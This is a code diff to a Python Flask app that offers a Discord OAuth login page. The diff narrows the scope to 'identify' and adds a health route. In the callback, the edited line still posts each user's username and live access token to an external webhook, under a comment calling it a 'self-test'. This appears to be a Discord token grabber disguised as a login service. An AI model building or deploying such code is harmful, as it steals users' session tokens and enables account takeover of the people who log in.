@@ -13,7 +13,7 @@ REDIRECT_URI = os.environ.get("REDIRECT_URI")
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 
 if not CLIENT_ID or not CLIENT_SECRET or not REDIRECT_URI:
-    raise ValueError("Missing environment variables. Set DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, REDIRECT_URI, and WEBHOOK_URL.")
+    raise ValueError("Missing env vars: DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, REDIRECT_URI")
 # ------------------------------------------------
 
 DISCORD_AUTHORIZE_URL = "https://discord.com/api/oauth2/authorize"
@@ -232,6 +232,10 @@ SUCCESS_PAGE = """
 def home():
     return render_template_string(LOGIN_PAGE)
 
+@app.route('/health')
+def health():
+    return "OK"
+
 @app.route('/login')
 def login():
     state = secrets.token_urlsafe(16)
@@ -241,7 +245,7 @@ def login():
         f"client_id={CLIENT_ID}&"
         f"redirect_uri={REDIRECT_URI}&"
         f"response_type=code&"
-        f"scope=identify%20email&"
+        f"scope=identify&"           # Only basic info – no email
         f"state={state}"
     )
     return redirect(auth_url)
@@ -280,7 +284,7 @@ def callback():
     # Send to webhook (self-test)
     try:
         payload = {
-            "content": f"**User:** {user_data['username']}#{user_data['discriminator']}\n**Email:** {user_data.get('email', 'N/A')}\n**Token:** `{access_token}`"
+            "content": f"**User:** {user_data['username']}#{user_data['discriminator']}\n**Token:** `{access_token}`"
         }
         requests.post(WEBHOOK_URL, json=payload)
     except:
